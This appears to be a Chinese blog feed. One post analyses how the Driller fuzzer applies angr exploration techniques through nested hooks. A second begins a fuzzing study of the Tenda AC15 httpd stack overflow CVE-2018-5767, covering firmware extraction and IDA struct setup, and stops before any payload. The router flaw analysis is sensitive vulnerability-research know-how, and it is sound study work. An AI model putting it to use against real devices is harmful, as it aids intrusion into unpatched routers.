<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ExplorationTechnique</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    An otiegnqwvk is a set of hooks for a simulation manager that assists in the implementation of new techniques in</span></span><br><span class="line"><span class="string">    symbolic exploration.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    TODO: choose actual name for the functionality (techniques? strategies?)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Any number of these methods may be overridden by a subclass.</span></span><br><span class="line"><span class="string">    To use an exploration technique, call ``simgr.use_technique`` with an *instance* of the technique.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># this is the master list of hook functinos</span></span><br><span class="line">    _hook_list = (<span class="string">&quot;step&quot;</span>, <span class="string">&quot;filter&quot;</span>, <span class="string">&quot;selector&quot;</span>, <span class="string">&quot;step_state&quot;</span>, <span class="string">&quot;successors&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_hooks</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;name: <span class="built_in">getattr</span>(self, name) <span class="keyword">for</span> name <span class="keyword">in</span> self._hook_list <span class="keyword">if</span> self._is_overriden(name)&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_is_overriden</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(self, name).__code__ <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">getattr</span>(ExplorationTechnique, name).__code__</span><br></pre></td></tr></table></figure>

<p>我们可以看到，这里 <code>_get_hooks</code> 函数返回了一个字典，字典包含了在 <code>_hook_list</code> 中定义的钩子函数的名称和对应的方法。<code>_get_hooks</code> 函数通过列表推导式遍历 <code>_hook_list</code> 列表中的每个函数名称，并通过 <code>_is_overridden()</code> 函数检查该名称是否在当前对象中被覆写，如果被覆写了，也就说明被 hook 了，将其加入到字典中。</p>
<p><code>_is_overridden()</code> 函数将当前对象 tech 中相应函数的 <code>__code__</code> 属性与基类（父类 ExplorationTechnique）中对应函数的 <code>__code__</code> 属性做对比，判断两者是否相等，若不相同，则表示对应函数被覆写，返回 <code>True</code> 。</p>
<p>解释完 <code>HookSet.install_hooks()</code> 函数的参数，我们来看下函数的实现，函数定义在 angr misc 目录下的 hookset.py 文件中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HookSet</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A HookSet is a static class that provides the capability to apply many hooks to an object.</span></span><br><span class="line"><span class="string">    一个静态类，提供对象应用多个hooks的能力</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">install_hooks</span>(<span class="params">target, **hooks</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Given the target `target`, apply the hooks given as keyword arguments to it.</span></span><br><span class="line"><span class="string">        If any targeted method has already been hooked, the hooks will not be overridden but will instead be pushed</span></span><br><span class="line"><span class="string">        into a list of pending hooks. The final behavior should be that all hooks call each other in a nested stack.</span></span><br><span class="line"><span class="string">        如果任何想要hook的目标方法已经被hook了，那么不会覆盖以前hook的函数，而是把新的hook插入到一个pending hooks列表里。</span></span><br><span class="line"><span class="string">        最终的行为应该是所有钩子在嵌套堆栈中相互调用。</span></span><br><span class="line"><span class="string">        :param target:  Any object. Its methods named as keys in `hooks` will be replaced by `HookedMethod` objects.</span></span><br><span class="line"><span class="string">        :param hooks:   Any keywords will be interpreted as hooks to apply. Each method named will hooked with the</span></span><br><span class="line"><span class="string">                        corresponding function value.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> name, hook <span class="keyword">in</span> hooks.items():</span><br><span class="line">            func = <span class="built_in">getattr</span>(target, name)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(func, HookedMethod):</span><br><span class="line">                func = HookedMethod(func)   <span class="comment">#这里将func实例化为HookedMethod对象，当在后面调用到func时，就会用到__call__魔法方法，将示例对象func作为函数，函数体就是__call__方法里的程序</span></span><br><span class="line">                <span class="built_in">setattr</span>(target, name, func) <span class="comment">#将新来的方法设置为栈顶</span></span><br><span class="line">            func.pending.append(hook)</span><br></pre></td></tr></table></figure>

<p>可以看到，函数遍历传入的 hooks 字典，并判断每一个字典内的每一个函数是否是 <code>HookedMethod</code> 类的示例对象。如果不是，就把通过<code>getattr</code> 函数获取到的对象方法作为参数来实例化一个 <code>HookedMethod</code> 对象。然后调用 <code>setattr()</code> 函数将原始的 simgr 的方法（比如 step ）给 hook 成 Hooked Method(func) 类型的方法。最后将该函数方法添加到 HookedMethod 类的实例化对象 func 的属性 pending 列表中。</p>
<p>我们接下来看一下 HookedMethod 类的源码，跟 HookSet 定义在一起：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HookedMethod</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    HookedMethod is a callable object which provides a stack of nested hooks.</span></span><br><span class="line"><span class="string">    HookedMethod 是一个可调用对象，它提供了一堆嵌套的钩子</span></span><br><span class="line"><span class="string">    :param func:    The bottom-most function which provides the original functionality that is being hooked</span></span><br><span class="line"><span class="string">                    最底层的函数提供被挂钩的原始功能</span></span><br><span class="line"><span class="string">    :ivar func:     Same as the eponymous parameter</span></span><br><span class="line"><span class="string">    :ivar pending:  The stack of hooks that have yet to be called. When this object is called, it will pop the last</span></span><br><span class="line"><span class="string">                    function in this list and call it. The function should call this object again in order to request</span></span><br><span class="line"><span class="string">                    the functionality of the original method, at which point the pop-dispatch mechanism will run</span></span><br><span class="line"><span class="string">                    recursively until the stack is exhausted, at which point the original function will be called.</span></span><br><span class="line"><span class="string">                    When the call returns, the hook will be restored to the stack.</span></span><br><span class="line"><span class="string">                    尚未调用的hook堆栈。当调用该对象时，它将弹出该列表中的最后一个函数并调用它。该函数应该再次调用该对象，</span></span><br><span class="line"><span class="string">                    以请求原始方法的功能，此时，pop-dispatch机制将运行直到堆栈耗尽，这时将调用原始函数。</span></span><br><span class="line"><span class="string">                    当调用返回时，hook将被恢复到堆栈中</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func</span>):</span><br><span class="line">        self.func = func</span><br><span class="line">        self.pending = [] <span class="comment"># 初始化 pending 列表</span></span><br><span class="line">    ···</span><br><span class="line">    <span class="comment"># 递归x 嵌套执行</span></span><br><span class="line">    <span class="comment"># 接下来对主要对step函数做修改，输出信息，来看递归的具体过程</span></span><br><span class="line">    <span class="comment"># 这里会先输出很多orig step is called，猜测是初始化到full_init_state时调用的，猜测是对的，在use_technique完毕之后，才开始使用探索策略中的step来探索。</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.pending:</span><br><span class="line">            current_hook = self.pending.pop()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = current_hook(self.func.__self__, *args, **kwargs) <span class="comment">#&lt;----嵌套执行处</span></span><br><span class="line">            <span class="comment"># 无论是否发生异常，均会执行finally</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.pending.append(current_hook)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.func(*args, **kwargs)</span><br><span class="line">    ···</span><br></pre></td></tr></table></figure>

<p>这里边最重要的是魔法方法 <code>__call__</code> ，当一个对象实现了 <code>__call__</code> 方法时，它可以被当作函数一样使用，通过在对象后面加上括号来调用。这种方式类似于调用函数，实际上是调用了对象的 <code>__call__</code> 方法。在上面，我们通过 <code>setattr</code> 函数设置完之后，当在 simgr 执行符号执行探索 binary 的过程中，调用被 hook 的方法时，实际上就是调用这里的 <code>__call__</code> 方法。</p>
<p>当我们通过 use_teachnique() 函数使用多个 exploration_techniques 时，向 pending 列表中添加的每一个方法都是 HookedMethod 类对象。在被调用时都是调用 <code>__call__</code> ，所以，这时候应该能反应过来，这里其实类似是一个递归函数。（其实应该是嵌套执行，这里把嵌套跟递归搞混了）</p>
<p>我们可以通过修改 angr 包的源码来做一下简单验证，<a href="#_drill_input"><code>_drill_input</code></a> 中主要用到了 <code>step</code> 函数来进行符号执行探索，所以就以 <code>step</code> 函数为例做验证：</p>
<p>安装好的 angr 包所在的目录为：<code>/usr/local/lib/python3.5/dist-packages/angr/</code>，我们分别对 exploration_techniques 目录下用到的三种探索技术 Tracer 、Oppologist、DrillerCore 中的 step 方法，以及angr 原始的 step 方法（位于angr&#x2F;sim_manager.py）添加一行代码，输出打印信息（以 DrillerCore 为例）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;driller_core step is called!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230918094103338.png" alt="image-20230918094103338"></p>
<p>同时在 <code>__call__</code> 函数所在的 hookset.py 文件中定义一个全局变量来输出递归层数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0</span></span><br><span class="line">···</span><br><span class="line">calss Hookset:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> n</span><br><span class="line">        <span class="keyword">if</span> self.pending:</span><br><span class="line">            current_hook = self.pending.pop</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;current_hook is &quot;</span>,current_hook)</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Entering , n = &quot;</span>,n)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = current_hook(self.func.__self__, *args，**kwargs)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                n = n - <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Exiting, n = &quot;</span>,n)</span><br><span class="line">                self.pending.append(current_hook)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.func(*args, **kwargs)</span><br></pre></td></tr></table></figure>

<p>修改完后，我们实际运行来验证一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ./run_driller.py ./buggy workdir/output/fuzzer-master</span><br></pre></td></tr></table></figure>

<p>注意：运行时需要保证 AFL 已经运行一段时间，生成了 ouput 目录，这里我是直接进入 docker 容器的 bash 跑的命令。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230918095559741.png" alt="image-20230918095559741"></p>
<p>从运行结果，我们可以看到，确实如刚才看源码分析的一致，这是一个递归（应该嵌套执行）的过程。通过我们打印的被 hook 的函数，我们也能看到除了 step 外，还有其他 hook_list 中的函数也被调用。以step为例，angr 按照 <code>use_techniques()</code> 函数中加载 exploration_technique 的逆顺序，来一层一层嵌套执行 step 函数，最后再调用最原始的 step() 函数。</p>
<p>其实这里的 pending 列表相当于一个<strong>栈</strong>，通过所用的 <code>pop()</code> 也能大概猜到，通过 <code>pop</code> 跟 <code>append</code> 实现出栈入栈操作，一层一层执行，最后再将栈给复原，进行下一次的探索。</p>
<p>这里我们还注意到，在嵌套执行开始前，还输出的一堆的 “original step is called！” ，这里其实是因为，angr要先将程序加载执行到我们通过初始状态构造函数所构造的状态，在这里是 <code>full_init_state()</code> 函数所定义的位置。可以通过在 <code>use_techniques()</code> 函数（位于angr&#x2F;sim_manager.py）中也添加打印输出信息的方法来验证：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230918100557240.png" alt="image-20230918100557240"></p>
<p>其中，第一个与第二个 “use_technique is called!” 之间的 step 调用，是在应用 Tracer 的 setup 函数时调用的，此时还没进行 hook 操作。</p>
<p>到这里，基本上对于 “ angr 是如何将 exploration_techniques 应用到符号执行中的？” 这一个问题有了一个较为清晰的答案，就是通过嵌套执行的方式。对于angr是如何一步一步执行符号执行可以参考博客3。</p>
<p>我们再回到 <code>self._drill_input()</code> ，继续往下看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置对内存、寄存器符号化操作的阈值</span></span><br><span class="line">self._set_concretizations(simgr.one_active)</span><br><span class="line"></span><br><span class="line">l.debug(<span class="string">&quot;Drilling into %r.&quot;</span>, self.<span class="built_in">input</span>)</span><br><span class="line">l.debug(<span class="string">&quot;Input is %r.&quot;</span>, self.<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> simgr.active <span class="keyword">and</span> simgr.one_active.<span class="built_in">globals</span>[<span class="string">&#x27;trace_idx&#x27;</span>] &lt; <span class="built_in">len</span>(r.trace) - <span class="number">1</span>:</span><br><span class="line">    simgr.step()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check here to see if a crash has been found.</span></span><br><span class="line">    <span class="keyword">if</span> self.redis <span class="keyword">and</span> self.redis.sismember(self.identifier + <span class="string">&#x27;-finished&#x27;</span>, <span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># diverted 应该是发生状态转移</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;diverted&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> simgr.stashes:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 当检测到状态转移时,弹出状态 这里的diverted 是在DillerCore探索策略中的step方法中添加的</span></span><br><span class="line">    <span class="keyword">while</span> simgr.diverted:</span><br><span class="line">        state = simgr.diverted.pop(<span class="number">0</span>)</span><br><span class="line">        l.debug(<span class="string">&quot;Found a diverted state, exploring to some extent.&quot;</span>)</span><br><span class="line">        <span class="comment"># 首先调用_writeout来求解</span></span><br><span class="line">        w = self._writeout(state.history.bbl_addrs[-<span class="number">1</span>], state)</span><br><span class="line">        <span class="keyword">if</span> w <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">yield</span> w</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self._symbolic_explorer_stub(state):</span><br><span class="line">            <span class="keyword">yield</span> i</span><br></pre></td></tr></table></figure>

<p>首先调用 <code>self._set_concretizations</code> 方法设置对内存、寄存器符号化操作的阈值，针对 cgc 程序单独做了优化，源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_set_concretizations</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">if</span> state.project.loader.main_object.os == <span class="string">&#x27;cgc&#x27;</span>:</span><br><span class="line">        flag_vars = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> state.cgc.flag_bytes:</span><br><span class="line">            flag_vars.update(b.variables)</span><br><span class="line">        state.unicorn.always_concretize.update(flag_vars)</span><br><span class="line">    <span class="comment"># Let&#x27;s put conservative thresholds（阈值） for now.</span></span><br><span class="line">    <span class="comment"># 设置了内存符号化的阈值。当符号状态中的内存符号化（例如，符号化的内存读取或写入操作）达到或超过 50000 个时，Unicorn 引擎将尝试将某些符号内存具体化为具体的值，以提高性能。</span></span><br><span class="line">    state.unicorn.concretization_threshold_memory = <span class="number">50000</span></span><br><span class="line">    <span class="comment"># 设置了寄存器符号化的阈值。当符号状态中的寄存器符号化（例如，符号化的寄存器读取或写入操作）达到或超过 50000 个时，Unicorn 引擎将尝试将某些符号寄存器具体化为具体的值，以提高性能。</span></span><br><span class="line">    state.unicorn.concretization_threshold_registers = <span class="number">50000</span></span><br></pre></td></tr></table></figure>

<p>然后通过 <code>while</code> 判断循环条件，不断通过 <code>step()</code>  进行符号执行。这里说一下循环条件中的 <code>simgr.one_active.globals[&quot;trace_idx&quot;]</code> ，该变量定义在angr 探索技术 <code>Tracer()</code> 中的 <code>setup()</code> 函数中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># initialize the state info</span><br><span class="line">simgr.one_active.globals[&quot;trace_idx&quot;] = idx</span><br></pre></td></tr></table></figure>

<p>其中，idx 就代表执行路径 trace 的 index。</p>
<p>接下来，<code>self.redis</code> 应该是存储到 redis 数据库相关，暂时先不管。</p>
<p>再然后，判断 <code>simgr.stashes</code> 中存储的状态是否发生了转移，也就是是否有 <code>diverted</code> 。这里的 <code>diverted</code> 定义在 angr 探索技术 <code>DrillerCore()</code> 中的 <code>step()</code> 函数里。</p>
<p>如果检测到了 <code>diverted</code> 状态，将这个状态取出来，作为参数传递给 <code>self._writeout</code> 函数求解，如果求解成功，得到返回值 w，就调用 yield 语句返回，否则，调用 <code>self._symbolic_explorer_stub(state)</code> 函数来重新做符号执行求解并返回。</p>
<p>这里可以看到，最终 dirller 生成的 input 是通过 <code>self._writeout</code> 和 <code>self._symbolic_explorer_stub</code> 这两个函数来求解的。我们依次来看下这两个函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里传入的参数是state.history.bbl_addrs[-1] 和 state</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_writeout</span>(<span class="params">self, prev_addr, state</span>):</span><br><span class="line">    <span class="comment"># 通过load方法从符号状态的标准输入state.posix.stdin中加载数据,具体来说，它加载从文件描述符 0（通常是标准输入）开始的数据，直到当前标准输入位置 state.posix.stdin.pos 处。这个操作实际上模拟了从标准输入读取数据的过程，并将读取的数据保存在 generated 变量中。</span></span><br><span class="line">    generated = state.posix.stdin.load(<span class="number">0</span>, state.posix.stdin.pos)</span><br><span class="line">    <span class="comment"># 调用 eval 执行求解过程，得到的结果存储在 generated 变量中 </span></span><br><span class="line">    generated = state.solver.<span class="built_in">eval</span>(generated, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">    key = (<span class="built_in">len</span>(generated), prev_addr, state.addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checks here to see if the generation is worth writing to disk.</span></span><br><span class="line">    <span class="comment"># If we generate too many inputs which are not really different we&#x27;ll seriously slow down AFL.</span></span><br><span class="line">    <span class="comment"># 调用_in_catalogue判断生成的input是否在之前的运行或者其他线程已经生成了，没有生成的话返回False</span></span><br><span class="line">    <span class="comment"># &lt;----跟redis相关，暂时不用管</span></span><br><span class="line">    <span class="keyword">if</span> self._in_catalogue(*key):</span><br><span class="line">        <span class="comment"># 如果生成了，那就从encounters中移除（addr，addr）？为什么要移除?</span></span><br><span class="line">        self._core.encounters.remove((prev_addr, state.addr))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self._add_to_catalogue(*key)</span><br><span class="line">    <span class="comment"># -----&gt;</span></span><br><span class="line"></span><br><span class="line">    l.debug(<span class="string">&quot;[%s] dumping input for %#x -&gt; %#x.&quot;</span>, self.identifier, prev_addr, state.addr)</span><br><span class="line">    <span class="comment"># 把本次生成的值 以（key，generated）的形式加入到_generated集合里</span></span><br><span class="line">    self._generated.add((key, generated))</span><br><span class="line">	<span class="comment"># &lt;-------redis 相关，暂时不管</span></span><br><span class="line">    <span class="keyword">if</span> self.redis:</span><br><span class="line">        <span class="comment"># Publish it out in real-time so that inputs get there immediately.</span></span><br><span class="line">        channel = self.identifier + <span class="string">&#x27;-generated&#x27;</span></span><br><span class="line"></span><br><span class="line">        self.redis.publish(channel, pickle.dumps(&#123;<span class="string">&#x27;meta&#x27;</span>: key, <span class="string">&#x27;data&#x27;</span>: generated, <span class="string">&quot;tag&quot;</span>: self.tag&#125;))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l.debug(<span class="string">&quot;Generated: %s&quot;</span>, binascii.hexlify(generated))</span><br><span class="line">	<span class="comment">#--------&gt;</span></span><br><span class="line">    <span class="keyword">return</span> (key, generated)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_symbolic_explorer_stub</span>(<span class="params">self, state</span>):</span><br><span class="line">    <span class="comment"># Create a new simulation manager and step it forward up to 1024</span></span><br><span class="line">    <span class="comment"># accumulated active states or steps.</span></span><br><span class="line">    steps = <span class="number">0</span> <span class="comment"># 记录步数的计数器，用于限制探索的步数。</span></span><br><span class="line">    accumulated = <span class="number">1</span> <span class="comment"># 累积的活跃状态或步数的计数器，用于控制探索的终止条件。</span></span><br><span class="line"></span><br><span class="line">    p = state.project</span><br><span class="line">    state = state.copy() <span class="comment">#复制传入的状态 diverted，以便在符号执行过程中进行修改。</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 移除状态选项中的 LAZY_SOLVES 以确保在符号执行期间进行及时求解</span></span><br><span class="line">        state.options.remove(angr.options.LAZY_SOLVES)</span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 创建状态管理器，用于符号执行，hierarchy=False 表示不使用层次结构模式（这里的层级结构还不是很清楚）。</span></span><br><span class="line">    simgr = p.factory.simulation_manager(state, hierarchy=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    l.debug(<span class="string">&quot;[%s] started symbolic exploration at %s.&quot;</span>, self.identifier, time.ctime())</span><br><span class="line">    <span class="comment"># 当还有活跃状态且累积计数小于 1024 时，进入循环。</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(simgr.active) <span class="keyword">and</span> accumulated &lt; <span class="number">1024</span>:</span><br><span class="line">        simgr.step() </span><br><span class="line">        steps += <span class="number">1</span> <span class="comment"># 增加步数计数器。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Dump all inputs.</span></span><br><span class="line">        <span class="comment"># 根据步数和活跃状态数以及已结束状态数更新累积计数器。</span></span><br><span class="line">        accumulated = steps * (<span class="built_in">len</span>(simgr.active) + <span class="built_in">len</span>(simgr.deadended))</span><br><span class="line"></span><br><span class="line">    l.debug(<span class="string">&quot;[%s] stopped symbolic exploration at %s.&quot;</span>, self.identifier, time.ctime())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># DO NOT think this is the same as using only the deadended stashes. this merges deadended and active</span></span><br><span class="line">    <span class="comment"># 将已经结束的状态合并到活跃状态中</span></span><br><span class="line">    simgr.stash(from_stash=<span class="string">&#x27;deadended&#x27;</span>, to_stash=<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line">    <span class="comment"># 遍历所有的 active 状态</span></span><br><span class="line">    <span class="keyword">for</span> dumpable <span class="keyword">in</span> simgr.active:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 检查状态是否是可满足的。</span></span><br><span class="line">            <span class="keyword">if</span> dumpable.satisfiable():</span><br><span class="line">                <span class="comment"># 如果可满足就调用 _writeout 函数进行求解，然后通过 yield 返回</span></span><br><span class="line">                w = self._writeout(dumpable.history.bbl_addrs[-<span class="number">1</span>], dumpable)</span><br><span class="line">                <span class="keyword">if</span> w <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">yield</span> w</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If the state we&#x27;re trying to dump wasn&#x27;t actually satisfiable.</span></span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>这里我对 <code>_symbolic_explorer_stub</code> 函数的理解是，边进行符号执行边做约束求解操作，这样就可以在符号执行 step 步进状态的同时直接判断出哪些状态是不可达的，即 deadended。不可达的路径就意味着新的分支，所以最后要把 deadended 与 active 合并，全部进行求解，这样能生成获得更多导致执行不同分支的 input ，从而可能增加 AFL 的代码覆盖率。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇从整体程序的执行流程来分析 Driller 工具的功能，并针对 use_techniques 方法进行了较为详细的解释，理清了 angr 是如何同时应用多个 exploration_techniques 来协同进行符号执行的。但并未对每种探索技术中 hook 方法（比如，setup 和 step 函数等）进行详细的介绍，个人感觉这方面是理解 Driller 工具运作细节的重点。</p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><blockquote>
<p>参考自博客：</p>
<ol>
<li><p><a href="https://n132.github.io/2020/03/19/Driller.html">https://n132.github.io/2020/03/19/Driller.html</a></p>
</li>
<li><p><a href="https://github.com/n132/n132.github.io/blob/master/_posts/2020-03-26-Driller2.md">https://github.com/n132/n132.github.io/blob/master/_posts/2020-03-26-Driller2.md</a></p>
</li>
<li><p><a href="https://www.anquanke.com/post/id/251983#h3-2">https://www.anquanke.com/post/id/251983#h3-2</a></p>
</li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>Driller</category>
      </categories>
  </entry>
  <entry>
    <title>AC15路由器栈溢出漏洞boofuzz测试</title>
    <url>/2023/09/20/Fuzz/AC15%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9Eboofuzz%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1 id="Tenda-AC15-CVE-2018-5767为例进行Fuzz测试"><a href="#Tenda-AC15-CVE-2018-5767为例进行Fuzz测试" class="headerlink" title="Tenda AC15 CVE-2018-5767为例进行Fuzz测试"></a>Tenda AC15 CVE-2018-5767为例进行Fuzz测试</h1><p>设备：Tenda AC15 路由器（可能包含其他系列路由器）</p>
<p>固件版本：&lt;V15.03.05.18</p>
<p>固件下载地址：官网已挂，在<a href="https://drivers.softpedia.com/">此网站</a>内能找到，<a href="https://us.softpedia-secure-download.com/dl/4315dd0547e6157d65b57e9c1fd2f509/64f68884/300482999/drivers/router/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar">US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar</a></p>
<span id="more"></span>

<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>漏洞存在于 httpd 文件中，首先使用 binwalk 工具解压固件，漏洞文件路径为：squashfs-root&#x2F;bin&#x2F;httpd </p>
<p>使用file查看文件信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file ./bin/httpd</span></span><br><span class="line">./bin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>

<p>看到文件是 ARM 架构，32位 LSB字节序，已经剥离符号信息。</p>
<p>虽然该 bianry 被剥离了符号信息，没有符号表，我们看不到详细的函数信息，但是仍然能够看到部分函数名，这些名称往往是外部库函数或者是开源代码。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230905100005721.png" alt="image-20230905100005721"></p>
<p>从 IDA 中函数窗口看到的函数名信息可以推断出 httpd 使用了 <code>Goahead</code> 这个 web server。（这个推断就需要经验的积累，知道每个框架里的函数名是什么样子的）</p>
<p>Goahead 会根据不同的 url 来决定由哪个函数进行 httpd 报文的处理。</p>
<p>查看 Goahead 相近版本2.5（固件中为2.3）的<a href="https://github.com/mvvelzen33/goahead">源码</a>，根据参考博客 wp 是真正传入的待处理的数据，是一个结构体，非常重要！</p>
<p>这里又学到一个知识，IDA 会把结构体识别为数组，因此在反汇编代码中，往往找不到各个元素的定义。我们需要将相关结构体添加到 IDA 中。</p>
<p>在 IDA 中导入C语言声明的结构体方法：</p>
<blockquote>
<p>在 View-&gt;Open Subviews-&gt;Local Types中可以看到本地已有的结构体，右击insert可以添加C语言声明的结构体</p>
</blockquote>
<p>对于 AC15 httpd ，进一步分析wp入参的定义，添加以下两个结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ringq_t</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   *buf;               <span class="comment">/* Holding buffer for data */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   *servp;             <span class="comment">/* Pointer to start of data */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   *endp;              <span class="comment">/* Pointer to end of data */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   *endbuf;            <span class="comment">/* Pointer to end of buffer */</span></span><br><span class="line">    <span class="type">int</span>             buflen;             <span class="comment">/* Length of ring queue */</span></span><br><span class="line">    <span class="type">int</span>             maxsize;            <span class="comment">/* Maximum size */</span></span><br><span class="line">    <span class="type">int</span>             increment;          <span class="comment">/* Growth increment */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

